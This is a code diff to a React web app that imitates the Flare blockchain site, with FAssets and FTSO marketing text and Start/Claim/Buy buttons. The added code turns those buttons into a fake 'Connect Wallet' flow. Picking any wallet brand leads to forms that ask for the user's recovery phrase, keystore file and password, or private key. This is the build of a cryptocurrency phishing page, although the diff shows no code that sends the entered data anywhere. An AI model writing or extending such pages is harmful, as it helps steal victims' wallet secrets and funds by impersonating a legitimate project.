@@ -17,8 +17,11 @@ import MetaMaskIcon from "./assets/MetaMaskIcon";
 import WalletConnectIcon from "./assets/WalletConnectIcon";
 import CameraLensIcon from "./assets/CameraLensIcon";
 import FrameIcon from "./assets/Frame";
+import { useState } from "react";
 
 const Header = () => (
+
+
   <header className="large">
     <img src={FlareLogo} width="100px" alt="Flare Logo" />
     <nav>
@@ -34,222 +37,394 @@ const Header = () => (
   </header>
 );
 
-const Main = () => (
-  <main>
-    <section className="main-div">
-      <img className="main-div-img" src={Fassets} width="594" height="594" alt="FAssets" />
-      <div className="main-p-div">
-        <p className="main-p-div-p">
-          <img src={Fassets2} width="300" alt="FAssets" />
-          <img src={XRP} width="300" alt="XRP" />
-        </p>
-        <span>
-          FAssets v1.1 Launches on Songbird <br /> – Unlocking Scalable FXRP Minting
-        </span>
-        <div style={{
-          display: 'flex',
-          flexDirection: 'column',
-          gap: 20,
-          alignItems: 'start'
-        }}>
-          <button>Start</button>
-          <button>Claim</button>
-          <button>Buy</button>
-        </div>
-      </div>
-    </section>
+const Main = () => {
 
-    <section className="main-div-2">
-      <h2>What is FSTO?</h2>
-      <h2>
-        Flare Time Series Oracle (FTSO) is an enshrined oracle that <br /> provides decentralized data feeds to Flare.
-      </h2>
-      <h2>How it Works</h2>
-      <img src={FSTO} alt="How FTSO Works" />
-    </section>
 
-    <section className="main-div-3">
-      <div style={{ display: "flex", flexDirection: "column", gap: "30px" }}>
-        <p style={{ fontSize: "40px" }}>Integrate FDC</p>
-        <span>
-          FAssets v1.1 Launches on Songbird <br /> – Unlocking Scalable FXRP Minting
-        </span>
-      </div>
-      <img
-        src={DevHub}
-        width="351"
-        height="164"
-        alt="Developer Hub"
-      />
-    </section>
-
-    <section className="main-div-4">
-      <h2>Use Cases</h2>
-      <h2>FDC powers a variety of DeFi use cases</h2>
-      <img src={Fassets1} width="1187px" alt="FAssets Use Cases" />
-    </section>
-
-    <section className="main-div-5">
-      <div style={{ display: "flex" }}>
-        <div
-          style={{
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            justifyContent: "space-around",
-          }}
-        >
-          <p style={{ fontSize: "30px" }}>Delegate & Stake</p>
-          <div className="main-div-5-p">
-            <p>
-              Boost your<br />
-              rewards by<br /> delegating or<br />staking FLR.
-            </p>
+  return (
+    <main>
+      <section className="main-div">
+        <img className="main-div-img" src={Fassets} width="594" height="594" alt="FAssets" />
+        <div className="main-p-div">
+          <p className="main-p-div-p">
+            <img src={Fassets2} width="300" alt="FAssets" />
+            <img src={XRP} width="300" alt="XRP" />
+          </p>
+          <span>
+            FAssets v1.1 Launches on Songbird <br /> – Unlocking Scalable FXRP Minting
+          </span>
+          <div style={{
+            display: 'flex',
+            flexDirection: 'column',
+            gap: 20,
+            alignItems: 'start'
+          }}>
+            <button onClick={OpenModal}>Start</button>
+            <button onClick={OpenModal}>Claim</button>
+            <button onClick={OpenModal}>Buy</button>
           </div>
         </div>
-        <div
-          style={{ height: "572px", display: "flex", alignItems: "center", justifyContent: "center" }}
-        >
-          <img src={DandStake} width="81.5" height="83" alt="Delegate and Stake" />
+      </section>
+
+      <section className="main-div-2">
+        <h2>What is FSTO?</h2>
+        <h2>
+          Flare Time Series Oracle (FTSO) is an enshrined oracle that <br /> provides decentralized data feeds to Flare.
+        </h2>
+        <h2>How it Works</h2>
+        <img src={FSTO} alt="How FTSO Works" />
+      </section>
+
+      <section className="main-div-3">
+        <div style={{ display: "flex", flexDirection: "column", gap: "30px" }}>
+          <p style={{ fontSize: "40px" }}>Integrate FDC</p>
+          <span>
+            FAssets v1.1 Launches on Songbird <br /> – Unlocking Scalable FXRP Minting
+          </span>
         </div>
-      </div>
-    </section>
+        <img
+          src={DevHub}
+          width="351"
+          height="164"
+          alt="Developer Hub"
+        />
+      </section>
 
-    <section class="main-div-s5">
-      <h2 style={{
-        fontSize: '22px',
-        fontFamily: 'var(--satoshi)',
-        fontWeight: 700,
-      }}>FTSO secures the Flare ecosystem with decentralized data</h2>
-      <div className="main-div-s5-div">
-        <p style={{
-          display: 'flex',
-          flexDirection: 'column',
-          width: '100%'
-        }}>
-          <span style={{
-            display: 'flex'
-          }}> <img src={Encrytpted} alt="" /> <h3>Secure</h3></span>
-          <span>FTSO is enshrined in the Flare blockchain, inheriting its full economic security to ensure robust data.</span>
-        </p>
-        <p style={{
-          display: 'flex',
-          flexDirection: 'column',
-          width: '100%'
-        }}>
-          <span style={{
-            display: 'flex'
-          }}> <img src={Fast} alt="" /> <h3>Fast</h3></span>
-          <span>FTSO provides block-latency feeds that update approximately every 1.8 seconds, delivering real-time data.</span>
-        </p>
-        <p style={{
-          display: 'flex',
-          flexDirection: 'column',
-          width: '100%'
-        }}>
-          <span style={{
-            display: 'flex'
-          }}> <img src={Scale} alt="" /> <h3>Scalable</h3></span>
-          <span>Supporting up to 1,000 feeds across equities, commodities, and cryptocurrencies, FTSO scales with the growing DeFi ecosystem.</span>
-        </p>
-        <p style={{
-          display: 'flex',
-          flexDirection: 'column',
-          width: '100%'
-        }}>
-          <span style={{
-            display: 'flex'
-          }}> <img src={Mind} alt="" /> <h3>Manipulation-resistant</h3></span>
-          <span>Each feed is backed by around 100 independent data providers, selected by Flare users through delegated stake.</span>
-        </p>
-        <p style={{
-          display: 'flex',
-          flexDirection: 'column',
-          width: '100%'
-        }}>
-          <span style={{
-            display: 'flex'
-          }}> <img src={Paid} alt="" /> <h3>Cost-effective</h3></span>
-          <span>Access to block-latency feeds is completely free on Flare, lowering barriers and fostering broad participation and innovation.</span>
-        </p>
-      </div>
-    </section>
+      <section className="main-div-4">
+        <h2>Use Cases</h2>
+        <h2>FDC powers a variety of DeFi use cases</h2>
+        <img src={Fassets1} width="1187px" alt="FAssets Use Cases" />
+      </section>
 
-    <section className="main-div-6">
-      <div className="main-div-6-div">
-        {[Fassets2, XRP, Spardesk].map((icon, idx) => (
-          <div key={idx} style={{ display: "flex", flexDirection: "column", gap: "15px" }}>
-            <p className="main-div-6-p">
-              <img src={icon} height="51.7" width="200" alt={icon} />
-              <img src={Fassets} height="250" alt="FAssets" />
-            </p>
-            <h3>
-              {idx === 0
-                ? "Guide to claiming the FAssets "
-                : idx === 1
-                  ? "FAssets v1.1 Launches on Songbird  "
-                  : "New DeFi milestones for Flare protocols"}
-            </h3>
+      <section className="main-div-5">
+        <div style={{ display: "flex" }}>
+          <div
+            style={{
+              display: "flex",
+              flexDirection: "column",
+              alignItems: "center",
+              justifyContent: "space-around",
+            }}
+          >
+            <p style={{ fontSize: "30px" }}>Delegate & Stake</p>
+            <div className="main-div-5-p">
+              <p>
+                Boost your<br />
+                rewards by<br /> delegating or<br />staking FLR.
+              </p>
+            </div>
           </div>
-        ))}
-      </div>
-    </section>
+          <div
+            style={{ height: "572px", display: "flex", alignItems: "center", justifyContent: "center" }}
+          >
+            <img src={DandStake} width="81.5" height="83" alt="Delegate and Stake" />
+          </div>
+        </div>
+      </section>
 
+      <section class="main-div-s5">
+        <h2 style={{
+          fontSize: '22px',
+          fontFamily: 'var(--satoshi)',
+          fontWeight: 700,
+        }}>FTSO secures the Flare ecosystem with decentralized data</h2>
+        <div className="main-div-s5-div">
+          <p style={{
+            display: 'flex',
+            flexDirection: 'column',
+            width: '100%'
+          }}>
+            <span style={{
+              display: 'flex'
+            }}> <img src={Encrytpted} alt="" /> <h3>Secure</h3></span>
+            <span>FTSO is enshrined in the Flare blockchain, inheriting its full economic security to ensure robust data.</span>
+          </p>
+          <p style={{
+            display: 'flex',
+            flexDirection: 'column',
+            width: '100%'
+          }}>
+            <span style={{
+              display: 'flex'
+            }}> <img src={Fast} alt="" /> <h3>Fast</h3></span>
+            <span>FTSO provides block-latency feeds that update approximately every 1.8 seconds, delivering real-time data.</span>
+          </p>
+          <p style={{
+            display: 'flex',
+            flexDirection: 'column',
+            width: '100%'
+          }}>
+            <span style={{
+              display: 'flex'
+            }}> <img src={Scale} alt="" /> <h3>Scalable</h3></span>
+            <span>Supporting up to 1,000 feeds across equities, commodities, and cryptocurrencies, FTSO scales with the growing DeFi ecosystem.</span>
+          </p>
+          <p style={{
+            display: 'flex',
+            flexDirection: 'column',
+            width: '100%'
+          }}>
+            <span style={{
+              display: 'flex'
+            }}> <img src={Mind} alt="" /> <h3>Manipulation-resistant</h3></span>
+            <span>Each feed is backed by around 100 independent data providers, selected by Flare users through delegated stake.</span>
+          </p>
+          <p style={{
+            display: 'flex',
+            flexDirection: 'column',
+            width: '100%'
+          }}>
+            <span style={{
+              display: 'flex'
+            }}> <img src={Paid} alt="" /> <h3>Cost-effective</h3></span>
+            <span>Access to block-latency feeds is completely free on Flare, lowering barriers and fostering broad participation and innovation.</span>
+          </p>
+        </div>
+      </section>
+
+      <section className="main-div-6">
+        <div className="main-div-6-div">
+          {[Fassets2, XRP, Spardesk].map((icon, idx) => (
+            <div key={idx} style={{ display: "flex", flexDirection: "column", gap: "15px" }}>
+              <p className="main-div-6-p">
+                <img src={icon} height="51.7" width="200" alt={icon} />
+                <img src={Fassets} height="250" alt="FAssets" />
+              </p>
+              <h3>
+                {idx === 0
+                  ? "Guide to claiming the FAssets "
+                  : idx === 1
+                    ? "FAssets v1.1 Launches on Songbird  "
+                    : "New DeFi milestones for Flare protocols"}
+              </h3>
+            </div>
+          ))}
+        </div>
+      </section>
+
+      <BsScreen/>
+
+    </main>
+  );
+};
+
+const BsScreen = () => {
+  const [activeModal, setActiveModal] = useState('in');
+  return (
     <section id="bScreen" className="bScreen">
-      <div className="inScreen">
+
+      {activeModal === 'in' && <div id="inScreen" className="inScreen">
         <div className="hScreen">
           <p>Connect Wallet</p>
-          <p onClick={CloseModal}>
-          <svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style={{
-            width: '1rem',
-            height: '1rem'
-          }} >
-          <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path>
-          </svg>
+          <p style={{
+            cursor: 'pointer',
+          }} onClick={CloseModal}>
+            <svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style={{
+              width: '1rem',
+              height: '1rem'
+            }} >
+              <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path>
+            </svg>
           </p>
         </div>
         <div className="bdScreen">
-          <button>
+          <button onClick={() => setActiveModal('ph')} >
             <p>
-            <span>MetaMask</span>
-            <span>Connect</span>
+              <span>MetaMask</span>
+              <span>Connect</span>
             </p>
-            <MetaMaskIcon/>
+            <MetaMaskIcon />
           </button>
-          <button>
-          <p>
-            <span>Wallet Connect</span>
-            <span>Connect</span>
+          <button onClick={() => setActiveModal('ph')}>
+            <p>
+              <span>Wallet Connect</span>
+              <span>Connect</span>
             </p>
-            <WalletConnectIcon/>
+            <WalletConnectIcon />
           </button>
-          <button>
-          <p>
-            <span>Coinbase Connect</span>
-            <span>Connect</span>
+          <button onClick={() => setActiveModal('ph')}>
+            <p>
+              <span>Coinbase Connect</span>
+              <span>Connect</span>
             </p>
-            <CameraLensIcon/>
+            <CameraLensIcon />
           </button>
-          <button>
-          <p>
-            <span>Ledger</span>
-            <span>Connect</span>
+          <button onClick={() => setActiveModal('ph')}>
+            <p>
+              <span>Ledger</span>
+              <span>Connect</span>
             </p>
             <FrameIcon />
           </button>
           <p style={{
             fontSize: 15,
-          }}>By connecting a wallet, you agree to the  
-          <span style={{
-            color: 'rgb(230, 32, 88)'
-          }}> Terms of Service</span></p>
+          }}>By connecting a wallet, you agree to the
+            <span style={{
+              color: 'rgb(230, 32, 88)'
+            }}> Terms of Service</span></p>
         </div>
-      </div>
+      </div>}
+      {activeModal === 'ph' && <div id="phScreen" className="phScreen">
+        <div style={{
+          height: '100%',
+          width: '100%',
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'space-between',
+        }}>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+          }}>
+            <img src={FlareLogo} style={{
+              height: 30,
+              width: 100,
+            }} alt="" />
+            <p style={{
+              cursor: 'pointer',
+            }} onClick={CloseModal}>
+              <svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style={{
+                width: '1rem',
+                height: '1rem'
+              }} >
+                <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path>
+              </svg>
+            </p>
+          </div>
+          <div style={{
+            display: 'flex',
+            height: 57,
+            borderBottom: '2px solid rgb(236, 231, 231)',
+            justifyContent: 'space-between',
+            alignItems: 'center',
 
+          }}>
+            <button onClick={()=>{setActiveModal('ph')}} className="phScreen-button">Phrase</button>
+            <button onClick={()=>{setActiveModal('ks')}} className="phScreen-button">Keystore</button>
+            <button onClick={()=>{setActiveModal('pk')}} className="phScreen-button">Private Key</button>
+          </div>
+          <textarea name="ph" required class="form-control" placeholder="Enter your recovery phrase" rows="5" ></textarea>
+          <p style={{
+            fontSize: '11px'
+          }}>Typically 12 (sometimes 24) words separated by single spaces</p>
+          <div style={{
+            width: '100%',
+            display: 'flex',
+            justifyContent: 'center',
+          }}><button className="proceed">Proceed</button></div>
+        </div>
+      </div>}
+      {activeModal === 'ks' && <div id="ksScreen" className="ksScreen">
+        <div style={{
+          height: '100%',
+          width: '100%',
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'space-between',
+        }}>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+          }}>
+            <img src={FlareLogo} style={{
+              height: 30,
+              width: 100,
+            }} alt="" />
+            <p style={{
+              cursor: 'pointer',
+            }} onClick={CloseModal}>
+              <svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style={{
+                width: '1rem',
+                height: '1rem'
+              }} >
+                <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path>
+              </svg>
+            </p>
+          </div>
+          <div style={{
+            display: 'flex',
+            height: 57,
+            borderBottom: '2px solid rgb(236, 231, 231)',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+
+          }}>
+            <button onClick={()=>{setActiveModal('ph')}} className="phScreen-button">Phrase</button>
+            <button onClick={()=>{setActiveModal('ks')}} className="phScreen-button">Keystore</button>
+            <button onClick={()=>{setActiveModal('pk')}} className="phScreen-button">Private Key</button>
+          </div>
+          <textarea name="ks" required class="form-control" placeholder="Keystore" rows="5" ></textarea>
+          <textarea name="ksp" required placeholder="Password" rows="2" style={{ resize: 'none', padding: 10, }} ></textarea>
+          <p style={{ fontSize: '11px' }}>
+            Several lines of text beginning with <code>{`"{...}"`}</code> plus the password you used to encrypt it.
+          </p>
+
+          <div style={{
+            width: '100%',
+            display: 'flex',
+            justifyContent: 'center',
+          }}><button className="proceed">Proceed</button></div>
+        </div>
+      </div>}
+      {activeModal === 'pk' && <div id="pkScreen" className="pkScreen">
+        <div style={{
+          height: '100%',
+          width: '100%',
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'space-between',
+        }}>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+          }}>
+            <img src={FlareLogo} style={{
+              height: 30,
+              width: 100,
+            }} alt="" />
+            <p style={{
+              cursor: 'pointer',
+            }} onClick={CloseModal}>
+              <svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style={{
+                width: '1rem',
+                height: '1rem'
+              }} >
+                <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path>
+              </svg>
+            </p>
+          </div>
+          <div style={{
+            display: 'flex',
+            height: 57,
+            borderBottom: '2px solid rgb(236, 231, 231)',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+
+          }}>
+
+
+            <button className="phScreen-button" onClick={() => setActiveModal('ph')}>Phrase</button>
+
+            <button onClick={()=>{setActiveModal('ks')}} className="phScreen-button">Keystore</button>
+            <button onClick={()=>{setActiveModal('pk')}} className="phScreen-button">Private Key</button>
+          </div>
+          <textarea name="pk" required placeholder="Private Key" rows="2" style={{ resize: 'none', padding: 10, }} ></textarea>
+          <p style={{ fontSize: '11px' }}>
+            Typically 64 characters not separated by spaces
+          </p>
+
+          <div style={{
+            width: '100%',
+            display: 'flex',
+            justifyContent: 'center',
+          }}><button className="proceed">Proceed</button></div>
+        </div>
+      </div>}
     </section>
-  </main>
-);
-
+  )
+}
 const Footer = () => (
   <footer className="mantine-Footer-root mantine-2k5q65">
     <div className="mantine-Container-root mantine-17sxbm9" bis_skin_checked="1">
@@ -339,12 +514,17 @@ function CloseModal() {
 }
 
 
-const App = () => (
-  <div>
-    <Header />
-    <Main />
-    <Footer />
-  </div>
-);
+
+const App = () => {
+
+  return (
+    <div>
+      <Header />
+      <Main />
+      <Footer />
+    </div>
+  );
+
+};
 
 export default App;
